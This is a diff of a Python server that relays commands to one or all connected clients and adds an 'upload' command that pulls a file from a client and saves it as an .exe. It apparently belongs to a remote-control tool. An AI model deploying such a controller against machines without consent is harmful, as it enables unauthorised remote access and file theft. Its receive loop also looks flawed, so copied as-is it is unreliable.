@@ -67,18 +67,20 @@ def ThreadStartServer():
 
         s.close()
 
-def SendCommandToClient(client, command):
-    fullReceived = ""
+def ReceiveDataFromClient(client, command):
     client.connection.send(command.encode())
-
+    
+    fullData = bytearray()
     while True:
-        data = client.connection.recv(256).decode()
-        if data != "DONE":
-            fullReceived += data
-        else:
-            break
+        fileSize = client.connection.recv(8)
+        print("File size is " + str(fileSize.decode()));
+        if str(fileSize.decode()) == "0":
+            break;
 
-    print("Received from " + client.info + ":\n" + fullReceived);
+        data = client.connection.recv(256)
+        fullData += data
+
+    return fullData
 
 threading.Thread(target=ThreadStartServer).start()
 
@@ -107,18 +109,34 @@ while True:
             
             if commandSplitted[1] == "all":
                 for client in clients:
-                    SendCommandToClient(client, command)
+                    receivedData = ReceiveDataFromClient(client, command)
+                    print("Received from " + client.info + ":\n" + receivedData.decode());
             else:
                 try:
                     clientNumber = int(commandSplitted[1])
 
                     client = clients[clientNumber]
-                    SendCommandToClient(client, command)
+                    receivedData = ReceiveDataFromClient(client, command)
+                    print("Received from " + client.info + ":\n" + receivedData.decode());
 
                 except ValueError as e:
                     print("[ERROR] " + str(e))
         else:
             print("[ERROR] cmd: No arguments specified.")
+
+    elif command.startswith("upload"):
+        
+        commandSplitted = command.strip().split(" ")
+        client = clients[0]
+
+        receivedData = ReceiveDataFromClient(client, command);
+        f = open("X:\\output\\test.exe", "wb")
+        if f:
+            print("## Writing to test.exe");
+            f.write(receivedData)
+            f.close()
+        else:
+            print("##  Error opening file for writing.")
             
     elif command.startswith("shutdown"):
         commandSplitted = command.strip().split(" ")
